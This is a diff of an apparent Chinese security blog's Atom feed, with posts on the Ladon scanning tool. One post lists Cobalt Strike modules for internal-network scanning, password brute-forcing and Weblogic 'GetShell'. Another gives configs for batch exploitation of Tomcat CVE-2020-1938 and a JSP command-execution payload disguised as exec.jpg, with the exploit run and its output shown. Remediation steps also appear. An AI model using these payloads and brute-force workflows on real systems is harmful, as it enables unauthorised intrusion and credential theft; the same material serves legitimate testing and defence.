@@ -35,16 +35,16 @@
     </summary>
     
     
-      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
-    
       <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
+    
+      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
     
@@ -79,9 +79,9 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
     
@@ -90,11 +90,11 @@
   </entry>
   
   <entry>
-    <title>Ladon For Cobalt Strike 4.0 一键扫描内网</title>
+    <title>Ladon For Cobalt Strike 4.0</title>
     <link href="http://k8gege.org/p/c5430395.html"/>
     <id>http://k8gege.org/p/c5430395.html</id>
     <published>2020-03-29T16:11:00.000Z</published>
-    <updated>2020-03-30T12:02:13.569Z</updated>
+    <updated>2020-03-30T12:08:04.579Z</updated>
     
     <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 6.2支持Cobalt Strike 4.0,内置58个功能<br>加载脚本Ladon.cna,通过Beacon命令或右键使用</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等<br>跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产)</p><h3 id="Ladon右键菜单"><a href="#Ladon右键菜单" class="headerlink" title="Ladon右键菜单"></a>Ladon右键菜单</h3><p>相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描</p><p>主菜单<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p><p>例子：WmiHash密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p><h3 id="Beacon命令帮助"><a href="#Beacon命令帮助" class="headerlink" title="Beacon命令帮助"></a>Beacon命令帮助</h3><p>Example: Ladon help</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="1-MS17010-MS17-010漏洞扫描"><a href="#1-MS17010-MS17-010漏洞扫描" class="headerlink" title="1.MS17010 MS17-010漏洞扫描"></a>1.MS17010 MS17-010漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 MS17010<br>结果:IP、SMB漏洞、机器名、操作系统版本<br><img alt="MS17010" data-original="http://k8gege.org/k8img/Ladon/cs/CS_MS17010.gif"></p><h3 id="2-OSscan-操作系统探测"><a href="#2-OSscan-操作系统探测" class="headerlink" title="2.OSscan 操作系统探测"></a>2.OSscan 操作系统探测</h3><p>Example: Ladon 192.168.1.8/24 OSscan<br>通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等）<br><img alt="OSscan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OSscan.gif"></p><h3 id="3-OnlinePC-存活主机扫描"><a href="#3-OnlinePC-存活主机扫描" class="headerlink" title="3.OnlinePC 存活主机扫描"></a>3.OnlinePC 存活主机扫描</h3><p>Example: Ladon 192.168.1.8/24 OnlinePC<br>也支持检测主机名/域名是否存活,结果IP、Mac、机器名<br><img alt="OnlinePC" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OnlinePC.gif"></p><h3 id="4-WebScan-Web扫描"><a href="#4-WebScan-Web扫描" class="headerlink" title="4.WebScan Web扫描"></a>4.WebScan Web扫描</h3><p>Example: Ladon 192.168.1.8/24 WebScan<br>内网站点扫描，获取服务器Banner、网页标题<br><img alt="WebScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebScan.gif"></p><h3 id="5-FtpScan-FTP密码扫描"><a href="#5-FtpScan-FTP密码扫描" class="headerlink" title="5.FtpScan FTP密码扫描"></a>5.FtpScan FTP密码扫描</h3><p>Example: Ladon 192.168.1.8/24 FtpScan<br>需上传user.txt和pass.txt至beacon工作目录<br><img alt="FtpScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_FtpScan.gif"></p><h3 id="6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"><a href="#6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）" class="headerlink" title="6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"></a>6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）</h3><p>Example: Ladon 192.168.1.8/24 WmiScan<br>Wmi方式批量爆破内网主机帐密,需上传user.txt和pass.txt至工作目录<br><img alt="WmiScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WmiScan.gif"></p><h3 id="7-CiscoScan-思科设备扫描"><a href="#7-CiscoScan-思科设备扫描" class="headerlink" title="7.CiscoScan 思科设备扫描"></a>7.CiscoScan 思科设备扫描</h3><p>Example: Ladon 192.168.1.8/24 CiscoScan<br>(IP、设备型号、主机名、Boot、硬件版本)<br><img alt="CiscoScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_CiscoScan.gif"></p><h3 id="8-UrlScan-C段域名URL扫描"><a href="#8-UrlScan-C段域名URL扫描" class="headerlink" title="8.UrlScan C段域名URL扫描"></a>8.UrlScan C段域名URL扫描</h3><p>Example: Ladon 192.168.1.8/24 UrlScan<br>通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP<br>或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备<br><img alt="UrlScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_UrlScan.gif"></p><h3 id="9-SameWeb-C段旁站扫描"><a href="#9-SameWeb-C段旁站扫描" class="headerlink" title="9.SameWeb C段旁站扫描"></a>9.SameWeb C段旁站扫描</h3><p>Example: Ladon 192.168.1.8/24 SameWeb<br>通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描<br>验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服<br><img alt="SameWeb" data-original="http://k8gege.org/k8img/Ladon/cs/CS_SameWeb.gif"></p><h3 id="10-WeblogicExp-amp-WeblogicPoc"><a href="#10-WeblogicExp-amp-WeblogicPoc" class="headerlink" title="10.WeblogicExp &amp; WeblogicPoc"></a>10.WeblogicExp &amp; WeblogicPoc</h3><p>Example: Ladon 192.168.1.8/24 WeblogicPoc<br>Example: Ladon 192.168.1.8/24 WeblogicExp<br>Weblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell<br><img alt="WeblogicExp" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WeblogicExp.gif"></p><h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p><h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumShare.gif"></p><h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MssqlScan.gif"></p><h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MysqlScan.gif"></p><h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SSHscan.gif"></p><h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_OracleScan.gif"></p><h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_HostIP.gif"></p><h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p><h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_IpcScan.gif"></p><h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_Base64.gif"></p><h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DeHex.gif"></p><h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SmbScan.gif"></p><h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p><h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DomainIP.gif"></p><h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SubDomain.gif"></p><h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebDir.gif"></p><h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>]]></content>
     
@@ -108,14 +108,14 @@
     </summary>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Cobalt Strike" scheme="http://k8gege.org/tags/Cobalt-Strike/"/>
     
@@ -165,18 +165,18 @@
     
       <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
       <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
     
     
       <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Code" scheme="http://k8gege.org/tags/Code/"/>
     
@@ -284,9 +284,9 @@
       <category term="嗅探" scheme="http://k8gege.org/categories/%E5%97%85%E6%8E%A2/"/>
     
     
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
     
@@ -341,34 +341,6 @@
   </entry>
   
   <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <link href="http://k8gege.org/p/42879.html"/>
-    <id>http://k8gege.org/p/42879.html</id>
-    <published>2020-03-28T03:39:45.663Z</published>
-    <updated>2020-03-30T03:04:56.043Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p><h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p><h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p><h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure><p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p><h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p><h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p><h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;p&gt;根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
     <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
     <link href="http://k8gege.org/p/40523.html"/>
     <id>http://k8gege.org/p/40523.html</id>
@@ -393,6 +365,34 @@
       <category term="Cobalt Strike" scheme="http://k8gege.org/tags/Cobalt-Strike/"/>
     
       <category term="Python" scheme="http://k8gege.org/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <link href="http://k8gege.org/p/42879.html"/>
+    <id>http://k8gege.org/p/42879.html</id>
+    <published>2020-03-28T03:39:45.663Z</published>
+    <updated>2020-03-30T03:04:56.043Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p><h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p><h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p><h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure><p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p><h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p><h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p><h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;p&gt;根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
